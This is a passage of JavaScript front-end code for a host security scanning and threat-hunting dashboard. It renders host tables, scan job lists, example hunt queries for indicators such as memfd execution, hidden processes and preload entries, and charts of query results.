          <div class="stat"><div class="label">Active</div><div class="value">${statusCounts.active.toLocaleString()}</div></div>
          <div class="stat warn"><div class="label">Inactive</div><div class="value">${statusCounts.inactive.toLocaleString()}</div></div>
          <div class="stat"><div class="label">Offline (&gt;24h)</div><div class="value">${statusCounts.offline.toLocaleString()}</div></div>
        </div>
        <section class="panel">
          <div class="panel-head">
            <h3>Hosts Management <span class="muted">(${rows.length.toLocaleString()} shown)</span></h3>
            <div class="toolbar">
              <input id="hostQ" type="search" placeholder="Search name, IP, OS, kernel…" value="${esc(state._hostQ || "")}" autocomplete="off" />
              <select id="hostPreset">
                <option value="">All statuses</option>
                <option value="active" ${state._hostPreset === "active" ? "selected" : ""}>Active only</option>
                <option value="inactive" ${state._hostPreset === "inactive" ? "selected" : ""}>Inactive only</option>
                <option value="offline" ${state._hostPreset === "offline" ? "selected" : ""}>Offline only</option>
              </select>
              <select id="hostAgent">
                <option value="">All agents</option>
                <option value="ssh" ${state._hostAgent === "ssh" ? "selected" : ""}>SSH probe</option>
                <option value="agentlite" ${state._hostAgent === "agentlite" ? "selected" : ""}>AgentLite</option>
                <option value="virtual" ${state._hostAgent === "virtual" ? "selected" : ""}>Virtual</option>
              </select>
              <select id="hostOs">
                <option value="">All OS</option>
                ${osIds.map((e) => `<option value="${esc(e)}" ${state._hostOs === e ? "selected" : ""}>${esc(e)}</option>`).join("")}
              </select>
              <select id="hostArch">
                <option value="">All arch</option>
                ${archs.map((e) => `<option value="${esc(e)}" ${state._hostArch === e ? "selected" : ""}>${esc(e)}</option>`).join("")}
              </select>
              <select id="hostEnv">
                <option value="">All envs</option>
                ${envs.map((e) => `<option value="${esc(e)}" ${state._hostEnv === e ? "selected" : ""}>${esc(e)}</option>`).join("")}
              </select>
              <select id="hostProfile">
                <option value="">All profiles</option>
                ${profiles.map((e) => `<option value="${esc(e)}" ${state._hostProfile === e ? "selected" : ""}>${esc(e)}</option>`).join("")}
              </select>
              <button class="btn primary" id="btnAddHost">Add hosts</button>
            </div>
          </div>
          <div class="hosts-bulkbar ${selCount ? "" : "dim"}">
            <span class="muted">${selCount ? `${selCount} selected` : "Select hosts for bulk actions"}</span>
            <div class="toolbar">
              <button class="btn ghost" id="btnHostSelectPage" ${pageRows.length ? "" : "disabled"}>${allPageSelected ? "Clear page" : "Select page"}</button>
              <button class="btn ghost" id="btnScanSelected" ${selCount ? "" : "disabled"}>Scan selected</button>
              <button class="btn ghost" id="btnTagSelected" ${selCount ? "" : "disabled"}>Tag selected</button>
              <button class="btn ghost" id="btnExportHosts">Export CSV</button>
              <button class="btn danger" id="btnDeleteSelected" ${selCount ? "" : "disabled"}>Delete</button>
            </div>
          </div>
          ${!rows.length ? `<div class="empty">No hosts match filters. Use <strong>Add hosts</strong> to register endpoints.</div>` : `
          <table class="data hosts-table"><thead><tr>
            <th class="col-check"><input type="checkbox" id="hostCheckAll" ${allPageSelected ? "checked" : ""} /></th>
            <th>Status</th><th>Host</th><th>Agent</th><th>Target</th><th>OS</th><th>Arch / kernel</th><th>Tags</th><th>Auth / last outcome</th><th>Last scan</th><th></th>
          </tr></thead><tbody>
            ${pageRows.map((h) => {
              const st = hostStatus(h);
              const agent = hostAgentInfo(h);
              const tags = hostTags(h);
              const checked = selected.has(h.id) ? "checked" : "";
              const href = `#host/${encodeURIComponent(h.id)}`;
              const abs = hostPermalink(h.id);
              const osLabel = h.os || h.os_id || "—";
              const osSub = [h.os_id, h.os_version].filter(Boolean).join(" ");
              return `<tr data-host-row="${esc(h.id)}" class="${checked ? "is-selected" : ""}">
                <td class="col-check" data-stop><input type="checkbox" data-host-check="${esc(h.id)}" ${checked} /></td>
                <td><span class="host-status ${st.key}">${esc(st.label)}</span></td>
                <td>
                  <a class="finding-link host-name-link" href="${esc(href)}" data-host-detail="${esc(h.id)}"><strong>${esc(h.display_name)}</strong></a>
                  <div class="mono muted host-id-line">${esc(shortId(h.id))}</div>
                </td>
                <td>
                  <div><span class="tag">${esc(agent.title)}</span></div>
                  <div class="muted" style="font-size:0.72rem;margin-top:0.15rem">${esc(agent.detail)}</div>
                </td>
                <td class="mono">${esc(h.primary_addr || "—")}:${h.ssh_port || 22}</td>
                <td>
                  <div>${esc(osLabel)}</div>
                  ${osSub && h.os ? `<div class="mono muted" style="font-size:0.72rem">${esc(osSub)}</div>` : ""}
                </td>
                <td class="mono muted">${esc(h.arch || "—")} · ${esc(h.kernel || "—")}</td>
                <td>${tags.length ? tags.map((t) => `<span class="tag">${esc(t)}</span>`).join(" ") : `<span class="muted">—</span>`}</td>
                <td>${esc(st.auth || "—")}</td>
                <td class="mono muted">${esc(fmtWhen(h.last_scan_at))}</td>
                <td class="hosts-actions" data-stop>
                  <button type="button" class="btn ghost tiny" data-copy-host-link="${esc(abs)}" title="Copy host link">Link</button>
                  ${agent.id === "virtual"
                    ? `<button class="btn ghost tiny" data-feed-virtual="${esc(h.id)}" data-feed-name="${esc(h.display_name)}" title="Update ingest from file">Update</button>
                       <button class="btn ghost tiny" data-copy-ingest="${esc(h.ingest_token || "")}" title="Copy ingest token">Token</button>`
                    : `<button class="btn ghost tiny" data-test-host="${esc(h.id)}">Test</button>
                  <button class="btn ghost tiny" data-scan-host="${esc(h.id)}">Scan</button>`}
                  <button class="btn ghost tiny" data-edit-host="${esc(h.id)}">Edit</button>
                  <button class="btn ghost tiny danger-text" data-delete-host="${esc(h.id)}">Delete</button>
                </td>
              </tr>`;
            }).join("")}
          </tbody></table>
          ${pager("host", state.hostPage, rows.length, state.pageSize)}`}
        </section>
      </div>`;
  }

  function scanDisplayState(s) {
    const j = s?.job || {};
    const m = s?.meta;
    const raw = String(j.state || "—");
    const hasMeta = m && (m.scan_id || m.outcome != null || m.finished_at);
    if (hasMeta && ["queued", "leased", "running"].includes(raw.toLowerCase())) {
      const o = m.outcome;
      let kind = "";
      if (typeof o === "string") kind = o;
      else if (o && typeof o === "object") kind = o.kind || Object.keys(o)[0] || "";
      kind = String(kind).toLowerCase();
      if (!kind || kind === "complete" || kind === "partial") return "complete";
      return "failed";
    }
    return raw;
  }

  function scans() {
    if (!state.scans.length) return `<section class="panel"><div class="empty">No scan jobs yet.</div></section>`;
    const start = state.scanPage * state.pageSize;
    const pageRows = state.scans.slice(start, start + state.pageSize);
    return `<section class="panel"><div class="panel-head"><h3>Scan jobs <span class="muted">(${state.scans.length.toLocaleString()})</span></h3>
      <span class="muted" style="font-size:0.8rem">Click a row to open the full scan page (inventory, findings, collectors).</span>
    </div>
      <table class="data"><thead><tr>
        <th>When</th><th>Scan</th><th>Host</th><th>Set</th><th>State</th><th>Coverage</th><th>Findings</th>
      </tr></thead><tbody>
        ${pageRows.map((s) => {
          const j = s.job || {};
          const m = s.meta || {};
          const fired = m.fired ?? (s.findings || []).length;
          const applicable = m.applicable_checks ?? "—";
          const when = scanWhen(s);
          const hostHref = j.host_id ? `#host/${encodeURIComponent(j.host_id)}` : "#/hosts";
          const scanHref = `#/scans/${encodeURIComponent(j.id)}`;
          const disp = scanDisplayState(s);
          return `<tr data-scan="${esc(j.id)}" class="scan-history-row" title="Open full scan page">
            <td class="mono muted">${esc(fmtWhen(when))}</td>
            <td class="mono"><a class="finding-link" href="${esc(scanHref)}" data-open-scan="${esc(j.id)}">${esc(shortId(j.id))}</a></td>
            <td><a class="finding-link" href="${esc(hostHref)}" data-goto-host="${esc(j.host_id || "")}">${esc(hostName(j.host_id))}</a></td>
            <td>${esc(j.check_set || "—")}</td>
            <td><span class="pill neutral">${esc(disp)}</span></td>
            <td class="mono">${esc(String(fired))}/${esc(String(applicable))}</td>
            <td>${(s.findings || []).length}</td>
          </tr>`;
        }).join("")}
      </tbody></table>
      ${pager("scan", state.scanPage, state.scans.length, state.pageSize)}
    </section>`;
  }

  const RPL_SAVED_KEY = "rustmite-rpl-saved";
  /** Example chips on Hunt → Results. Replace example-host or use a real host_name from the fleet. */
  const RPL_EXAMPLE_GROUPS = [
    {
      id: "inventory",
      label: "Per host",
      hint: "Swap example-host for a real host_name",
      examples: [
        {
          label: "Processes",
          q: 'host_name="example-host" kind="process" | fields timestamp, process_name, process_id, user, path, exe_memfd | sort -timestamp | head 200',
        },
        {
          label: "Files",
          q: 'host_name="example-host" kind="file_meta" | fields timestamp, path, file_hash, user, message | sort path | head 200',
        },
        {
          label: "Entropy files",
          q: 'host_name="example-host" kind="file_entropy" | fields path, severity, message | sort -severity | head 100',
        },
        {
          label: "Sockets",
          q: 'host_name="example-host" (kind="socket" OR kind="hidden_socket") | fields process_name, src_ip, dest_ip, path, message | head 100',
        },
        {
          label: "Accounts",
          q: 'host_name="example-host" kind="account" | fields user, path, message | sort user | head 100',
        },
        {
          label: "SSH keys",
          q: 'host_name="example-host" kind="authorized_key" | fields user, path, message | head 50',
        },
        {
          label: "Services",
          q: 'host_name="example-host" kind="service" | fields path, message | sort path | head 100',
        },
        {
          label: "Sessions",
          q: 'host_name="example-host" kind="utmp_session" | fields user, src_ip, process_id, message | head 50',
        },
        {
          label: "Modules",
          q: 'host_name="example-host" (kind="module" OR kind="hidden_module") | fields path, message | head 50',
        },
        {
          label: "Cron / tasks",
          q: 'host_name="example-host" kind="scheduled_task" | fields path, user, message | head 50',
        },
      ],
    },
    {
      id: "findings",
      label: "Findings",
      examples: [
        {
          label: "High severity",
          q: 'severity="critical" OR severity="high" | fields timestamp, host_name, kind, process_name, path, severity, message | sort -timestamp | head 50',
        },
        {
          label: "memfd exec",
          q: 'exe_memfd=1 | fields timestamp, host_name, process_name, process_id, path, user | sort -timestamp | head 100',
        },
        {
          label: "Hidden process",
          q: 'kind="hidden_process" OR collector="decloak.process" | fields timestamp, host_name, process_name, path, message | head 50',
        },
        {
          label: "Integrity drift",
          q: 'kind="integrity_mismatch" | fields timestamp, host_name, path, file_hash, severity, message | head 50',
        },
        {
          label: "IoC hits",
          q: 'kind="ioc_hit" | fields timestamp, host_name, path, severity, message | head 50',
        },
        {
          label: "Preload / LD",
          q: 'kind="preload" | fields timestamp, host_name, path, message | head 50',
        },
        {
          label: "Suspicious paths",
          q: 'path="/tmp*" OR path="/dev/shm*" OR path="/var/tmp*" | fields timestamp, host_name, kind, process_name, path, severity | head 50',
        },
      ],
    },
    {
      id: "fleet",
      label: "Fleet",
      examples: [
        {
          label: "Top processes",
          q: 'kind="process" process_name=* | stats count by process_name | sort -count | head 20',
        },
        {
          label: "Events by host",
          q: 'host_name=* | stats count by host_name | sort -count | head 25',
        },
        {
          label: "Kinds overview",
          q: '| stats count by kind | sort -count | head 30',
        },
        {
          label: "Timeline by kind",
          q: "| timechart span=1h count by kind limit=8",
        },
        {
          label: "Last 24h critical",
          q: 'last 24h severity="critical" | fields timestamp, host_name, kind, path, message | sort -timestamp | head 100',
        },
        {
          label: "SSH keys fleet",
          q: 'kind="authorized_key" | stats count by host_name, user | sort -count | head 40',
        },
      ],
    },
  ];

  function rplExampleHostPlaceholder() {
    return "example-host";
  }

  function rplExamplesWithHost() {
    const host = rplExampleHostPlaceholder();
    return RPL_EXAMPLE_GROUPS.map((g) => ({
      ...g,
      examples: (g.examples || []).map((ex) => ({
        ...ex,
        q: String(ex.q || "").split("example-host").join(host),
      })),
    }));
  }

  function renderRplExampleChips() {
    const groups = rplExamplesWithHost();
    return `<div class="rpl-example-board" aria-label="Example hunts">
      ${groups.map((g) => `
        <div class="rpl-example-group">
          <div class="rpl-example-group-head">
            <span class="rpl-example-group-label">${esc(g.label)}</span>
            ${g.hint ? `<span class="muted rpl-example-group-hint">${esc(g.hint.replace("example-host", rplExampleHostPlaceholder()))}</span>` : ""}
          </div>
          <div class="rpl-chips">
            ${(g.examples || []).map((ex) =>
              `<button type="button" class="btn ghost rpl-chip" data-rpl-ex="${esc(ex.q)}" title="${esc(ex.q)}">${esc(ex.label)}</button>`
            ).join("")}
          </div>
        </div>`).join("")}
    </div>`;
  }

  function loadRplSaved() {
    if (state._rplSaved) return state._rplSaved;
    try {
      state._rplSaved = JSON.parse(localStorage.getItem(RPL_SAVED_KEY) || "[]");
    } catch (_) {
      state._rplSaved = [];
    }
    if (!Array.isArray(state._rplSaved)) state._rplSaved = [];
    return state._rplSaved;
  }

  function persistRplSaved() {
    localStorage.setItem(RPL_SAVED_KEY, JSON.stringify(state._rplSaved || []));
  }

  const RPL_HISTORY_KEY = "rustmite-rpl-history";

  function loadRplHistory() {
    if (state._rplHistory) return state._rplHistory;
    try {
      state._rplHistory = JSON.parse(localStorage.getItem(RPL_HISTORY_KEY) || "[]");
    } catch (_) {
      state._rplHistory = [];
    }
    if (!Array.isArray(state._rplHistory)) state._rplHistory = [];
    return state._rplHistory;
  }

  function persistRplHistory() {
    localStorage.setItem(RPL_HISTORY_KEY, JSON.stringify(state._rplHistory || []));
  }

  function pushRplHistory(query) {
    const q = String(query || "").trim();
    if (!q) return;
    loadRplHistory();
    state._rplHistory = [
      { id: `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`, query: q, ts: Date.now() },
      ...state._rplHistory.filter((h) => h.query !== q),
    ].slice(0, 40);
    persistRplHistory();
  }

  function isoHoursAgo(hours) {
    return new Date(Date.now() - hours * 3600 * 1000).toISOString().replace(/\.\d{3}Z$/, "Z");
  }

  function filteredRplResult(res) {
    if (!res) return res;
    const filter = String(state._rplResultFilter || "").trim();
    if (!filter) return res;
    const rows = res.rows || [];
    let re = null;
    let err = null;
    if (state._rplResultFilterRegex) {
      try {
        re = new RegExp(filter, "i");
      } catch (e) {
        err = e.message || "invalid regex";
      }
    }
    if (err) {
      return { ...res, _filterError: err, _filterMatch: 0, rows: [] };
    }
    const filtered = rows.filter((row) => {
      const blob = Object.values(row).map((v) => cellText(v)).join("\n");
      return re ? re.test(blob) : blob.toLowerCase().includes(filter.toLowerCase());
    });
    return {
      ...res,
      rows: filtered,
      _filterMatch: filtered.length,
      _filterTotal: rows.length,
      count: filtered.length,
    };
  }

  async function ensureRplFields() {
    if (state._rplFields?.length) return state._rplFields;
    try {
      const res = await api("/v1/hunt/rpl/fields");
      state._rplFields = res.fields || [];
      if (state.view === "hunt") render();
      return state._rplFields;
    } catch (_) {
      state._rplFields = state._rplFields || [];
      return state._rplFields;
    }
  }

  function renderRplFieldListHtml(fields, fieldQ) {
    const q = (fieldQ || "").toLowerCase();
    const filtered = q
      ? fields.filter((f) => String(f.name).toLowerCase().includes(q))
      : fields;
    if (!filtered.length) {
      return `<div class="muted" style="padding:0.5rem">${fields.length ? "No matching fields" : "Loading fields…"}</div>`;
    }
    return filtered.map((f) => `
      <button type="button" class="rpl-field" data-rpl-field="${esc(f.name)}" title="${esc(f.column || f.name)}${f.numeric ? " · numeric" : ""}">
        <span>${esc(f.name)}</span>
        ${f.numeric ? `<em>#</em>` : ""}
      </button>`).join("");
  }

  function snapshotRplForm() {
    const ta = $("#rplQuery");
    if (ta) state._rplQuery = ta.value;
    const form = $("#rplHuntForm");
    if (!form) return;
    const fd = new FormData(form);
    state._rplTimeFrom = String(fd.get("time_from") || "");
    state._rplTimeTo = String(fd.get("time_to") || "");
    const lim = Number(fd.get("limit"));
    if (Number.isFinite(lim) && lim > 0) state._rplLimit = lim;
  }

  function bindRplFieldButtons(root) {
    $$("[data-rpl-field]", root || document).forEach((b) => {
      b.addEventListener("click", () => {
        const name = b.dataset.rplField;
        const ta = $("#rplQuery");
        if (!ta) {
          state._rplQuery = `${state._rplQuery || ""} ${name}=`.trim();
          state._rplTab = "results";
          render();
          return;
        }
        const start = ta.selectionStart ?? ta.value.length;
        const end = ta.selectionEnd ?? start;
        const insert = `${name}=`;
        ta.value = ta.value.slice(0, start) + insert + ta.value.slice(end);
        state._rplQuery = ta.value;
        ta.focus();
        const pos = start + insert.length;
        ta.setSelectionRange(pos, pos);
      });
    });
  }

  function cellText(v) {
    if (v == null) return "";
    if (typeof v === "object") return JSON.stringify(v);
    return String(v);
  }

  function numVal(v) {
    const n = Number(v);
    return Number.isFinite(n) ? n : 0;
  }

  function rplPalette(i) {
    const colors = ["#0d7a66", "#0369a1", "#c2410c", "#7c3aed", "#b86a12", "#157a3a", "#b42318", "#4b5563"];
    return colors[i % colors.length];
  }

  function renderHistogramBars(buckets) {
    if (!buckets || !buckets.length) {
      return `<div class="rpl-chart-empty muted">No histogram buckets</div>`;
    }
    const max = Math.max(...buckets.map((b) => numVal(b.count)), 1);
    return `<div class="rpl-hist" title="Event histogram">
      ${buckets.map((b) => {
        const c = numVal(b.count);
        const h = Math.max(2, Math.round((c / max) * 100));
        const label = esc(cellText(b.bucket)).slice(0, 19);
        return `<div class="rpl-hist-bar" style="height:${h}%" title="${label}: ${c}">
          <span class="rpl-hist-tip">${label}<br>${c}</span>
        </div>`;
      }).join("")}
    </div>`;
  }

  function renderTimechartBars(rows, columns) {
    if (!rows || !rows.length) {
      return `<div class="rpl-chart-empty muted">No timechart rows</div>`;
    }
    const seriesKey = columns.find((c) => /^(series|by)$/i.test(c))
      || columns.find((c) => !/^(bucket|c|count|timestamp)$/i.test(c) && c !== columns[0]);
    const countKey = columns.find((c) => /^(c|count)$/i.test(c)) || columns.find((c) => c !== "bucket" && c !== seriesKey);
    const byBucket = new Map();
    const seriesSet = new Set();
    for (const row of rows) {
      const bucket = cellText(row.bucket ?? row.timestamp ?? "");
      const series = seriesKey ? cellText(row[seriesKey]) || "(all)" : "count";
      const val = numVal(row[countKey] ?? row.c ?? row.count);
      seriesSet.add(series);
      if (!byBucket.has(bucket)) byBucket.set(bucket, {});
      byBucket.get(bucket)[series] = (byBucket.get(bucket)[series] || 0) + val;
    }
    const seriesList = [...seriesSet].slice(0, 12);
    const buckets = [...byBucket.keys()];
    let max = 1;
    for (const b of buckets) {
      const vals = byBucket.get(b);
      const sum = seriesList.reduce((a, s) => a + (vals[s] || 0), 0);
      if (sum > max) max = sum;
    }
    return `
      <div class="rpl-timechart">
        <div class="rpl-timechart-bars">
          ${buckets.map((b) => {
            const vals = byBucket.get(b);
            const parts = seriesList.map((s, i) => {
              const v = vals[s] || 0;
              if (!v) return "";
              const h = Math.max(2, Math.round((v / max) * 100));
              return `<div class="rpl-tc-seg" style="height:${h}%;background:${rplPalette(i)}" title="${esc(b)} · ${esc(s)}: ${v}"></div>`;
            }).join("");
            return `<div class="rpl-tc-col">${parts}</div>`;
          }).join("")}
        </div>
        <div class="rpl-legend">
          ${seriesList.map((s, i) => `<span><i style="background:${rplPalette(i)}"></i>${esc(s)}</span>`).join("")}
        </div>
      </div>`;
  }

  function renderStatsBars(rows, columns) {
    if (!rows || !rows.length) {
      return `<div class="rpl-chart-empty muted">No stats rows</div>`;
    }
    const labelCol = columns.find((c) => {
      const sample = rows[0]?.[c];
      return typeof sample === "string" || (sample != null && !Number.isFinite(Number(sample)));
    }) || columns[0];
    const valueCol = columns.find((c) => c !== labelCol && Number.isFinite(Number(rows[0]?.[c])))
      || columns.find((c) => /count|^c$/i.test(c))
      || columns[1]
      || columns[0];
    const max = Math.max(...rows.map((r) => numVal(r[valueCol])), 1);
    return `<div class="rpl-stats-bars">
      ${rows.slice(0, 40).map((r) => {
        const label = esc(cellText(r[labelCol]));
        const v = numVal(r[valueCol]);
        const w = Math.max(2, Math.round((v / max) * 100));
        return `<div class="rpl-stats-row">
          <span class="rpl-stats-label" title="${label}">${label}</span>
          <div class="rpl-stats-track"><span style="width:${w}%"></span></div>
          <span class="rpl-stats-val mono">${v}</span>
        </div>`;
      }).join("")}
    </div>`;
  }

  function renderSingleValue(rows, columns) {
    const col = (columns && columns[0]) || Object.keys(rows?.[0] || {})[0];
    const v = rows?.[0] ? cellText(rows[0][col]) : "—";
    return `<div class="rpl-single"><div class="rpl-single-val">${esc(v)}</div><div class="muted">${esc(col || "value")}</div></div>`;
  }

  function renderRplTimeline(res, hist) {
    if (res?.viz === "timechart") {
      return renderTimechartBars(res.rows || [], res.columns || []);
    }
    if (hist?.buckets?.length) return renderHistogramBars(hist.buckets);
    return `<div class="rpl-chart-empty muted">Run a query to populate the timeline</div>`;
  }

  function renderRplPanelBody(res, panelViz, selected) {
    if (!res) return renderRplTable(null, selected);
    const viz = panelViz || res.viz || "table";
    if (viz === "timechart") return renderTimechartBars(res.rows || [], res.columns || []);
    if (viz === "bar" || viz === "stats") return renderStatsBars(res.rows || [], res.columns || []);
    if (viz === "single_value") return renderSingleValue(res.rows || [], res.columns || []);
    return renderRplTable(res, selected);
  }

  function renderRplTable(res, selected) {
    const rows = res?.rows || [];
    const cols = res?.columns?.length
      ? res.columns
      : rows[0]
        ? Object.keys(rows[0])
        : [];
    if (!rows.length) {
      return `<div class="empty">No rows — start ClickHouse (docker/clickhouse) or refine the query</div>`;
    }
    return `<div class="rpl-table-wrap"><table class="data rpl-table"><thead><tr>
      ${cols.map((c) => `<th>${esc(c)}</th>`).join("")}
    </tr></thead><tbody>
      ${rows.map((r, i) => `<tr data-rpl-row="${i}" class="${selected === i ? "selected" : ""}">
        ${cols.map((c) => `<td class="mono">${esc(cellText(r[c]).slice(0, 200))}</td>`).join("")}
      </tr>`).join("")}
    </tbody></table></div>`;
  }

  function renderRplInspector(res, selected) {
    const row = res?.rows?.[selected];
    if (!row) return `<div class="empty">Select a row</div>`;
    const entries = Object.entries(row);
    return `<div class="rpl-inspector">
      <div class="rpl-inspector-head">Event ${selected + 1}</div>
      <dl class="kv">
        ${entries.map(([k, v]) => `<dt>${esc(k)}</dt><dd class="mono">${esc(cellText(v))}</dd>`).join("")}
      </dl>
    </div>`;
  }

  function renderRplGuideHtml() {
    const guide = window.RPL_GUIDE || { groups: [], sections: [], cheatsheet: [] };
    const groups = guide.groups || [];
    const sections = guide.sections || [];
    const sheet = guide.cheatsheet || [];
    return `
      <div class="rpl-guide">
        <div class="rpl-guide-cheat">
          <h4>Cheatsheet</h4>
          <div class="rpl-chips">
            ${sheet.map((ex) => `<button type="button" class="btn ghost rpl-chip" data-rpl-run="${esc(ex.query)}" title="${esc(ex.query)}">${esc(ex.title || ex.query)}</button>`).join("")}
          </div>
        </div>
        ${groups.map((g) => {
          const secs = sections.filter((s) => s.group === g.id);
          return `<section class="rpl-guide-group">
            <header class="rpl-guide-group-head">
              <h3>${esc(g.title)}</h3>
              <p class="muted">${esc(g.description || "")}</p>
            </header>
            ${secs.map((s) => `
              <article class="rpl-guide-section" id="rpl-sec-${esc(s.id)}">
                <h4>${esc(s.title)}${s.command ? ` <code>| ${esc(s.command)}</code>` : ""}</h4>
                ${s.lead ? `<p class="rpl-guide-lead">${esc(s.lead)}</p>` : ""}
                ${(s.paragraphs || []).map((p) => `<p>${esc(p)}</p>`).join("")}
                ${(s.callouts || []).map((c) => `
                  <div class="rpl-callout rpl-callout-${esc(c.variant || "note")}">
                    ${c.title ? `<strong>${esc(c.title)}</strong>` : ""}
                    <span>${esc(c.body)}</span>
                  </div>`).join("")}
                ${s.list ? `<ul>${s.list.map((i) => `<li>${esc(i)}</li>`).join("")}</ul>` : ""}
                ${s.table ? `<div class="rpl-table-wrap"><table class="data"><thead><tr>${s.table.headers.map((h) => `<th>${esc(h)}</th>`).join("")}</tr></thead>
                  <tbody>${s.table.rows.map((r) => `<tr>${r.map((c) => `<td>${esc(c)}</td>`).join("")}</tr>`).join("")}</tbody></table></div>` : ""}
                ${(s.examples || []).map((ex) => `
                  <div class="rpl-ex">
                    ${ex.title ? `<div class="rpl-ex-title">${esc(ex.title)}</div>` : ""}
                    <pre class="mono">${esc(ex.query)}</pre>
                    ${ex.note ? `<div class="muted">${esc(ex.note)}</div>` : ""}
                    <div class="rpl-ex-actions">
                      <button type="button" class="btn ghost" data-rpl-copy="${esc(ex.query)}">Copy</button>
                      <button type="button" class="btn primary" data-rpl-run="${esc(ex.query)}">Run</button>
                    </div>
                  </div>`).join("")}
              </article>`).join("")}
          </section>`;
        }).join("")}
      </div>`;
  }

  function fleetSiftHostTags(h) {
    const labels = h.labels || {};
    const out = [];
    const seen = new Set();
    const add = (t) => {
      const s = String(t || "").trim();
      if (!s || seen.has(s)) return;
      seen.add(s);
      out.push(s);
    };
    if (labels.tags) String(labels.tags).split(/[,;\s]+/).forEach(add);
    if (labels.tag) String(labels.tag).split(/[,;\s]+/).forEach(add);
    ["env", "profile", "region"].forEach((k) => {
      if (labels[k]) add(labels[k]);
    });
    return out;
  }

  function siftKnownTags() {
    const tags = new Set();
    (state.hosts || []).forEach((h) => fleetSiftHostTags(h).forEach((t) => tags.add(t)));
    return [...tags].sort((a, b) => a.localeCompare(b));
  }

  function siftInventoryKeep() {
    return Math.max(
      1,
      Math.min(50, Number(state.settings?.effective?.scan_history_per_host ?? 3) || 3)
    );
  }

  /** 1-based inventory scan index (1 = newest finished per host). */
  function siftInventoryIndex() {
    const raw = String(state._siftInventory || "1").trim();
    let n = parseInt(raw, 10);
    if (!Number.isFinite(n) || n < 1) {
      n = (raw === "previous" || raw === "prev") ? 2 : 1;
    }
    return Math.min(n, siftInventoryKeep());
  }

  /** Map hostId → finished scans newest-first (rebuilt when scans array identity changes). */
  function siftScansByHost() {
    if (state._siftScansByHost && state._siftScansSrc === state.scans) {
      return state._siftScansByHost;
    }
    const map = new Map();
    for (const s of state.scans || []) {
      const j = s.job || {};
      const m = s.meta || {};
      const sid = String(j.id || m.scan_id || "");
      const hid = String(j.host_id || m.host_id || "");
      if (!sid || !hid) continue;
      const st = String(j.state || m.outcome || "").toLowerCase();
      if (st && !["complete", "failed", "cancelled"].includes(st) && !m.finished_at) continue;
      const when = m.finished_at || j.updated_at || j.created_at || "";
      if (!when) continue;
      const setLabel = j.check_set || (m.probe_version === "virtual-import" ? "virtual-import" : "scan");
      let list = map.get(hid);
      if (!list) {
        list = [];
        map.set(hid, list);
      }
      list.push({ sid, when, setLabel, outcome: m.outcome || j.state || "" });
    }
    for (const list of map.values()) {
      list.sort((a, b) => String(b.when).localeCompare(String(a.when)));
    }
    state._siftScansByHost = map;
    state._siftScansSrc = state.scans;
    return map;
  }

  function siftHostFinishedScans(hostId) {
    return siftScansByHost().get(String(hostId || "")) || [];
  }

  /** Nth newest finished scan for host (1-based), or null if that deep history is missing. */
  function siftHostInventoryScan(hostId, index = siftInventoryIndex()) {
    const list = siftHostFinishedScans(hostId);
    const i = Math.max(0, (index || 1) - 1);
    return list[i] || null;
  }

  function siftHostSearchHay(h) {
    const tags = fleetSiftHostTags(h);
    return [
      h.display_name || "",
      h.primary_addr || "",
      h.id || "",
      h.agent_kind || "",
      tags.join(" "),
    ].join(" ").toLowerCase();
  }

  function siftFilteredHosts() {
    const q = String(state._siftHostQ || "").trim().toLowerCase();
    const tokens = q ? q.split(/\s+/).filter(Boolean) : [];
    const env = String(state._siftEnv || "").trim();
    const kind = String(state._siftKind || "").trim().toLowerCase();
    const after = String(state._siftScanAfter || "").trim();
    const before = String(state._siftScanBefore || "").trim();
    const afterDigits = after.replace(/\D/g, "").slice(0, 14);
    const beforeDigits = before.replace(/\D/g, "").slice(0, 14);
    const needInv = !!(afterDigits || beforeDigits);
    const invN = siftInventoryIndex();
    if (needInv) siftScansByHost();

    const out = [];
    for (const h of state.hosts || []) {
      if (kind === "agentlite") {
        if (!isAgentLiteHost(h)) continue;
      } else if (kind === "ssh") {
        if (isAgentLiteHost(h) || isVirtualHost(h)) continue;
      } else if (kind && String(h.agent_kind || "ssh").toLowerCase() !== kind) continue;
      if (env && (h.labels?.env || "") !== env) continue;
      if (tokens.length) {
        const hay = siftHostSearchHay(h);
        if (!tokens.every((t) => hay.includes(t))) continue;
      }
      if (needInv) {
        const invScan = siftHostInventoryScan(h.id, invN);
        const invWhen = invScan?.when || h.last_scan_at || "";
        const last = String(invWhen).replace(/\D/g, "").slice(0, 14);
        if (!last) continue;
        if (afterDigits && last < afterDigits) continue;
        if (beforeDigits && last > beforeDigits) continue;
      }
      out.push(h);
    }
    out.sort((a, b) => String(a.display_name || "").localeCompare(String(b.display_name || "")));
    return out;
  }

  function siftSelectedHostIds() {
    if (!state._siftSelectedHosts) state._siftSelectedHosts = new Set();
    return state._siftSelectedHosts;
  }

  function mlProgressHtml(prog, extraClass) {
    if (!prog) return "";
    const pct = Math.max(0, Math.min(100, Number(prog.pct) || 0));
    const steps = prog.steps || [];
    const debug = prog.debug || [];
    return `<div class="import-progress sift-run-progress ${esc(extraClass || "")}" role="status" aria-live="polite">
      <div class="ip-title">${esc(prog.title || "Working…")}</div>
      <p class="ip-detail mono">${esc(prog.detail || "")}</p>
      <div class="bar ${prog.indeterminate ? "indeterminate" : ""}"><span style="width:${pct}%"></span></div>
      <div class="ip-meta"><span>${esc(prog.phase || "")}</span><span class="mono">${pct}%</span></div>
      ${steps.length ? `<ol class="sift-progress-steps">${steps.map((s) => `
        <li class="sift-progress-step sift-progress-step--${esc(s.status || "pending")}">${esc(s.label)}</li>
      `).join("")}</ol>` : ""}
      ${debug.length ? `<ul class="ml-debug-log">${debug.map((d) => `
        <li><span class="mono muted">${esc(d.ts || "")}</span> ${esc(d.msg || "")}</li>
      `).join("")}</ul>` : ""}
    </div>`;
  }

  function mlDebugNow() {
    try {
      return new Date().toLocaleTimeString();
    } catch (_) {
      return "";
    }
  }

  function mlPushDebug(progKey, msg) {
    const prog = state[progKey];
    if (!prog) return;
    const debug = [...(prog.debug || []), { ts: mlDebugNow(), msg: String(msg || "") }].slice(-12);
    state[progKey] = { ...prog, debug };
  }

  function siftProgressHtml() {
    return mlProgressHtml(state._siftProgress, "sift-run-progress");
  }

  function anomarkProgressHtml() {
    return mlProgressHtml(state._anomarkProgress, "anomark-run-progress");
  }

  function siftRunDebugHtml(last) {
    if (!last) return "";
    const dbg = last._debug || state._siftLastDebug || {};
    const sources = last.sources || [];
    const procRows = sources.reduce((n, s) => n + Number(s.process_rows || 0), 0);
    const fileRows = sources.reduce((n, s) => n + Number(s.file_rows || 0), 0);
